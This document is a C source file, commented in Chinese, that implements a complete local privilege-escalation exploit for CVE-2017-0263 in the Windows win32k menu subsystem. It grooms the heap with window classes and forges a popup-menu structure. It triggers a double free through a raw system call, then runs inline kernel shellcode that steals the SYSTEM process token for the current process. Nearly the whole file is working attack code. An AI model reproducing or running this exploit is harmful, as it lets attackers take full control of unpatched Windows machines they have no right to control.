#include "CVE-2017-0263.h"

DWORD g_dwCount = 0;
DWORD g_dwShadowCount = 0;
DWORD g_dwWindowCount = 0;
HWND g_hwndMenuHit = NULL;
HWND g_hWindowHunt = NULL;
HWND g_hWindowList[0x100] = { 0 };
PVOID g_pvHeadFake = NULL;
PVOID g_pvAddrFlags = NULL;
DWORD g_dwPopupMenuRoot = 0;
BOOL g_bExecute = FALSE;

BOOL Exploit_CVE_2017_0263()
{
	BOOL bRet = TRUE;
	HANDLE hThread = NULL;

	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ExploitThread, NULL, 0, NULL);
	if (!hThread)
	{
		ShowError("CreateThread", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	while (!g_bExecute)
	{
		Sleep(500);
	}

exit:
	if (hThread) CloseHandle(hThread);
	return bRet;
}

DWORD ExploitThread(LPVOID lpParameter)
{
	DWORD dwRet = 1;

	if (!Init_CVE_2017_0263())
	{
		dwRet = 0;
		goto exit;
	}

	if (!POC_CVE_2017_0263())
	{
		dwRet = 0;
		goto exit;
	}

exit:
	return dwRet;
}

BOOL Init_CVE_2017_0263()
{
	BOOL bRet = TRUE;

	HMODULE handle = NULL;

	handle = GetModuleHandle(NULL);
	if (!handle)
	{
		ShowError("GetModuleHandle", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	DWORD i = 0;

	// 创建用于后面填充释放的内存
	for (i = 0; i < 0x100; i++)
	{
		WNDCLASSEX Class = { 0 };
		CHAR szTemp[20] = { 0 };
		HWND hwnd = NULL;

		wsprintf(szTemp, "%x-%d", rand(), i);
		Class.cbSize = sizeof(WNDCLASSEXA);
		Class.lpfnWndProc = DefWindowProc;
		Class.cbWndExtra = 0;
		Class.hInstance = handle;
		Class.lpszMenuName = NULL;
		Class.lpszClassName = szTemp;
		if (!RegisterClassEx(&Class))
		{
			ShowError("RegisterClassEx", GetLastError());
			continue;
		}
		hwnd = CreateWindowEx(0,
			szTemp,
			NULL,
			WS_OVERLAPPED,
			0, 0, 0, 0,
			NULL,
			NULL,
			handle,
			NULL);
		if (!hwnd)
		{
			ShowError("CreateWindowEx", GetLastError());
			continue;
		}
		g_hWindowList[g_dwWindowCount++] = hwnd;
	}

	PSHELLCODE pvShellCode = (PSHELLCODE)VirtualAlloc(NULL,
		PAGE_SIZE,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (!pvShellCode)
	{
		ShowError("VirtualAlloc", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	ZeroMemory(pvShellCode, PAGE_SIZE);
	pvShellCode->pid = GetCurrentProcessId();
	pvShellCode->off_CLS_lpszMenuName = 0x50;
	pvShellCode->off_THREADINFO_ppi = 0x0B8;
	pvShellCode->off_EPROCESS_ActiveLink = 0x0B8;
	pvShellCode->off_EPROCESS_Token = 0x0F8;

	CopyMemory(pvShellCode->pfnWinProc, ShellCode_CVE_2017_0263, 0xBE0);

	lHMValidateHandle HMValidateHandle = (lHMValidateHandle)GetHMValidateHandle();
	if (!HMValidateHandle)
	{
		bRet = FALSE;
		goto exit;
	}

	// 保存tagCLS的地址
	for (i = 0; i < g_dwWindowCount; i++)
	{
		pvShellCode->tagCLS[i] = *(PVOID *)((PBYTE)HMValidateHandle(g_hWindowList[i], TYPE_WINDOW) + 0x64);
	}

	DWORD dwOldProtect = 0;

	if (!VirtualProtect(pvShellCode, PAGE_SIZE, PAGE_EXECUTE_READ, &dwOldProtect))
	{
		ShowError("VirtualProtect", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	WNDCLASSEX wc = { 0 };
	char *szClassName = "WNDCLASSHUNT";

	wc.cbSize = sizeof(wc);
	wc.lpszClassName = szClassName;
	wc.cbWndExtra = 0x200;
	wc.lpfnWndProc = DefWindowProc;
	wc.hInstance = handle;

	if (!RegisterClassEx(&wc))
	{
		ShowError("RegisterClassEx", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	g_hWindowHunt = CreateWindowEx(WS_EX_LEFT,
											 szClassName,
											 NULL,
											 WS_OVERLAPPED,
											 0, 0, 1, 1,
											 NULL,
											 NULL,
											 handle,
											 NULL);
	if (!g_hWindowHunt)
	{
		ShowError("CreateWindowEx", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	PTHRDESKHEAD head = (PTHRDESKHEAD)HMValidateHandle(g_hWindowHunt, TYPE_WINDOW);

	// 预留4字节
	PBYTE pbExtra = (PBYTE)head->pSelf + 0xB0 + 4;

	// 用来赋值伪造的tagPOPUPMENU
	g_pvHeadFake = pbExtra + 0x44;

	// 将剩余内存空间的内容保存为扩展空间的首地址
	for (i = 1; i <= 0x80; i++)
	{
		SetWindowLongW(g_hWindowHunt, sizeof(DWORD) * i, (DWORD)pbExtra);
	}

	PVOID pti = head->h.pti;

	// 伪装tagPOPUPMENU中的窗口的成员
	SetWindowLongW(g_hWindowHunt, 0x28, 0);
	SetWindowLongW(g_hWindowHunt, 0x50, (LONG)pti); // pti
	SetWindowLongW(g_hWindowHunt, 0x6C, 0);
	SetWindowLongW(g_hWindowHunt, 0x1F8, 0xC033C033);
	SetWindowLongW(g_hWindowHunt, 0x1FC, 0xFFFFFFFF);

	// 获取关键标志位的地址
	g_pvAddrFlags = (PVOID)((DWORD)head->pSelf + 0x16);

	// 指定窗口的消息处理例程
	SetWindowLongW(g_hWindowHunt, GWL_WNDPROC, (DWORD)pvShellCode->pfnWinProc);

exit:
	return bRet;
}

DWORD __declspec(naked) ShellCode_CVE_2017_0263(HWND hWnd, int code, WPARAM wParam, LPARAM lParam)
{
	__asm
	{
		push ebp
		mov ebp, esp

		// 如果消息不是0x9F9F，函数退出
		mov eax, dword ptr[ebp + 0xC]
		cmp eax, 0x9F9F
		jne LocFAILED

		// 如果cs的值为0x1B则是用户模式(这里判断低2位是否为0就可以)，函数退出
		mov ax, cs
		cmp ax, 0x1B
		je LocFAILED

		// 将bDialogWindow标志位自增
		cld
		// ecx = tagWND
		mov ecx, dword ptr[ebp + 8]
		inc dword ptr[ecx + 0x16]

		pushad
		// 通过当前EIP首地址获取SHELLCODE对象的首地址
		call $5
		$5 :
		pop edx
			sub edx, 0x443

			//  将tagCLS数组与参数wParam的tagPOPUPMENU对比
			mov ebx, 0x100
			// esi = SHELLCODE->tagCLS
			lea esi, [edx + 0x18]
			// edi = tagPOPUPMENU
			mov edi, dword ptr[ebp + 0x10]

			LocForCLS:
		test ebx, ebx
			je LocGetEPROCESS
			// 获取tagCLS中非0的数值
			lods dword ptr[esi]
			dec ebx
			cmp eax, 0
			je LocForCLS
			// 获取tagCLS->lpszMenuName
			add eax, dword ptr[edx + 8]
			// 比较是否是符合条件的tagCLS
			cmp dword ptr[eax], edi
			jne LocForCLS
			// 不符合则清空
			and dword ptr[eax], 0
			jmp LocForCLS

			LocGetEPROCESS :
		// ecx = tagWND->pti
		mov ecx, dword ptr[ecx + 8]
			// ebx = SHELLCODE->off_THREADINFO_ppi
			mov ebx, dword ptr[edx + 0x0C]
			// ecx = tagTHREADINFO->ppi
			mov ecx, dword ptr[ebx + ecx]
			// ecx = tagPROCESSINFO->EPROCESS
			mov ecx, dword ptr[ecx]
			// ebx = SHELLCODE->off_EPROCESS_ActiveLink
			mov ebx, dword ptr[edx + 0x10]
			// eax = SHELLCODE->pid
			mov eax, dword ptr[edx + 4]

			push ecx
			LocForCurrentPROCESS :
		// 判断PID是否是当前进程PID
		cmp dword ptr[ebx + ecx - 4], eax
			je LocFoundCURRENT
			// 取下一进程EPROCESS
			mov ecx, dword ptr[ebx + ecx]
			sub ecx, ebx
			jmp LocForCurrentPROCESS

			LocFoundCURRENT :
		// 将找到的EPROCESS赋给edi
		mov  edi, ecx
			pop  ecx

			LocForSystemPROCESS :
		// 判断EPROCESS的PID是否为4
		cmp dword ptr[ebx + ecx - 4], 4
			je LocFoundSYSTEM
			// 取下一进程EPROCESS
			mov ecx, dword ptr[ebx + ecx]
			sub ecx, ebx
			jmp LocForSystemPROCESS

			LocFoundSYSTEM :
		// 将SYSTEM进程EPROCESS赋给esi
		mov esi, ecx

			// eax=SHELLCODE->off_EPROCESS_Token
			mov eax, dword ptr[edx + 0x14]
			// 当前进程和系统进程EPROCESS指向TOKEN
			add esi, eax
			add edi, eax
			// 将系统进程TOKEN赋值给当前进程的TOKEN
			lods dword ptr[esi]
			stos dword ptr es : [edi]

			// 将系统进程TOKEN对象的PointerCount + 2，即增加引用计数
			and eax, 0x0FFFFFFF8
			add dword ptr[eax - 0x18], 2

			popad
			// 提权成功，返回值设为0x9F9F
			mov eax, 0x9F9F
			jmp LocRETURN

			LocFAILED :
		// 提权失败，返回值设为1
		mov eax, 1
			LocRETURN :
			leave
			ret 0x10
	}
}

LRESULT CALLBACK WinHookProc(int code, WPARAM wParam, LPARAM lParam)
{
	tagCWPSTRUCT *cwp = (tagCWPSTRUCT *)lParam;

	if (cwp->message == WM_NCCREATE)
	{
		CHAR szTemp[0x20] = { 0 };

		if (!GetClassName(cwp->hwnd, szTemp, 0x14))
		{
			ShowError("GetClassName", GetLastError());
		}

		if (strcmp(szTemp, "#32768") == 0)
		{
			g_hwndMenuHit = cwp->hwnd;
		}
		else if (strcmp(szTemp, "SysShadow") == 0 && g_hwndMenuHit)
		{
			g_dwShadowCount++;

			if (g_dwShadowCount == 3)
			{
				// 为第三个阴影窗口设置处理函数
				if (!SetWindowLong(cwp->hwnd,
								   GWL_WNDPROC,
								   (ULONG)ShowdowWinProc))
				{
					ShowError("SetWindowLong", GetLastError());
				}
			}
			else
			{
				// 设置窗口先隐藏在显示，这样会创建阴影窗口
				if (!SetWindowPos(g_hwndMenuHit, NULL, 0, 0, 0, 0,
					              SWP_NOSIZE | SWP_NOMOVE | SWP_NOZORDER | SWP_HIDEWINDOW) ||
					!SetWindowPos(g_hwndMenuHit, NULL, 0, 0, 0, 0,
						          SWP_NOSIZE | SWP_NOMOVE | SWP_NOZORDER | SWP_SHOWWINDOW))
				{
					ShowError("SetWindowPos", GetLastError());
				}
			}
		}
	}

	return CallNextHookEx(0, code, wParam, lParam);
}

LRESULT WINAPI ShowdowWinProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	// 销毁阴影窗口的时候再次触发漏洞
	if (msg == WM_NCDESTROY && !g_bExecute)
	{
		TAGPOPUPMENU tagPopupMenu = { 0 };

		tagPopupMenu.flags = 0x00098208;
		tagPopupMenu.spwndNotify = (DWORD)g_pvHeadFake;
		tagPopupMenu.spwndPopupMenu = (DWORD)g_pvHeadFake;
		tagPopupMenu.spwndNextPopup = (DWORD)g_pvHeadFake;
		tagPopupMenu.spwndPrevPopup = (DWORD)g_pvAddrFlags - 4;
		tagPopupMenu.spmenu = (DWORD)g_pvHeadFake;
		tagPopupMenu.spmenuAlternate = (DWORD)g_pvHeadFake;
		tagPopupMenu.spwndActivePopup = (DWORD)g_pvHeadFake;
		tagPopupMenu.ppopupmenuRoot = 0xFFFFFFFF;
		tagPopupMenu.ppmDelayedFree = (DWORD)g_pvHeadFake;
		tagPopupMenu.posSelectedItem = 0xFFFFFFFF;
		tagPopupMenu.psDropped = (DWORD)g_pvHeadFake;
		tagPopupMenu.dwReserve = 0;

		// 其中某一块会占用上一次释放的内存块
		for (DWORD i = 0; i < g_dwWindowCount; i++)
		{
			SetClassLongW(g_hWindowList[i], GCL_MENUNAME, (DWORD)&tagPopupMenu);
		}

		// 再次释放内存,导致bServerSideWindowProc标志位置位
		CallNtUserMNDraLeave();

		// 发送消息执行ShellCode
		DWORD dwRet = SendMessageW(g_hWindowHunt, 0x9F9F, g_dwPopupMenuRoot, 0);
		if (dwRet != 0x9F9F)
		{
			ShowError("SendMessage", dwRet);
		}
		else
		{
			g_bExecute = TRUE;
		}
	}

	return DefWindowProc(hwnd, msg, wParam, lParam);
}

void __declspec(naked) CallNtUserMNDraLeave()
{
	__asm
	{
		mov eax, 0x11EC	// NtUserMNDraLeave调用号
		int 0x2E
		ret
	}
}

VOID CALLBACK WinEventProc(HWINEVENTHOOK hWinEventHook,
						   DWORD         event,
						   HWND          hwnd,
						   LONG          idObject,
						   LONG          idChild,
						   DWORD         idEventThread,
						   DWORD         dwmsEventTime)
{
	if (g_dwCount == 0)
	{
		lHMValidateHandle HMValidateHandle = (lHMValidateHandle)GetHMValidateHandle();
		// 获取tagPOPUPMENU对象地址
		g_dwPopupMenuRoot = *(PDWORD)((PBYTE)HMValidateHandle(hwnd, TYPE_WINDOW) + 0xb0);
	}

	if (++g_dwCount >= 2)
	{
		// 发送销毁菜单消息
		SendMessage(hwnd, MN_ENDMENU, 0, 0);
	}
	else
	{
		// 发生鼠标左键按下消息
		SendMessage(hwnd, WM_LBUTTONDOWN, 1, 0x00020002); // (2,2)
	}
}

BOOL POC_CVE_2017_0263()
{
	BOOL bRet = TRUE;

	HMODULE handle = NULL;

	handle = GetModuleHandle(NULL);
	if (!handle)
	{
		ShowError("GetModuleHandle", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	HMENU hpopupMenu[2] = { 0 };

	// 创建两个弹出菜单窗口
	hpopupMenu[0] = CreatePopupMenu();
	hpopupMenu[1] = CreatePopupMenu();

	if (!hpopupMenu[0] || !hpopupMenu[1])
	{
		ShowError("CreatePopupMenu", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	LPCSTR szMenuItem = "item";
	MENUINFO mi = { 0 };

	mi.cbSize = sizeof(mi);
	mi.fMask = MIM_STYLE;
	mi.dwStyle = MNS_AUTODISMISS | MNS_MODELESS | MNS_DRAGDROP;

	// 设置创建的菜单的属性
	if (!SetMenuInfo(hpopupMenu[0], &mi) ||
		!SetMenuInfo(hpopupMenu[1], &mi))
	{
		ShowError("CreatePopupMenu", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	// 为菜单添加菜单项，第二个窗口为第一个窗口子菜单
	if (!AppendMenu(hpopupMenu[0], MF_BYPOSITION | MF_POPUP, (UINT_PTR)hpopupMenu[1], szMenuItem) ||
		!AppendMenu(hpopupMenu[1], MF_BYPOSITION | MF_POPUP, 0, szMenuItem))
	{
		ShowError("AppendMenuA", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	HWND hWindowMain = NULL;
	WNDCLASSEX wc = { 0 };
	char *szClassName = "WNDCLASSMAIN";

	wc.cbSize = sizeof(wc);
	wc.lpfnWndProc = DefWindowProc;
	wc.hInstance = handle;
	wc.lpszClassName = szClassName;

	if (!RegisterClassEx(&wc))
	{
		ShowError("RegisterClassEx", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	// 创建窗口为弹出菜单的拥有者
	hWindowMain = CreateWindowEx(WS_EX_LAYERED |
								 WS_EX_TOOLWINDOW |
								 WS_EX_TOPMOST,
								 szClassName,
								 NULL,
								 WS_VISIBLE,
								 0, 0, 1, 1,
								 NULL,
								 NULL,
								 handle,
								 NULL);
	if (!hWindowMain)
	{
		ShowError("CreateWindowEx", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	// 设置消息HOOK
	if (!SetWindowsHookEx(WH_CALLWNDPROC,
						  (HOOKPROC)WinHookProc,
						  handle,
						  GetCurrentThreadId()))
	{
		ShowError("SetWindowHookEx", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	// 设置EVENT_SYSTEM_MENUPOPUPSTART事件处理函数
	SetWinEventHook(EVENT_SYSTEM_MENUPOPUPSTART,
					EVENT_SYSTEM_MENUPOPUPSTART,
					handle,
					WinEventProc,
					GetCurrentProcessId(),
					GetCurrentThreadId(),
					0);

	// 触发漏洞
	if (!TrackPopupMenuEx(hpopupMenu[0], 0, 0, 0, hWindowMain, NULL))
	{
		ShowError("TrackPopupMenuEx", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	MSG msg = { 0 };
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

exit:
	return bRet;
}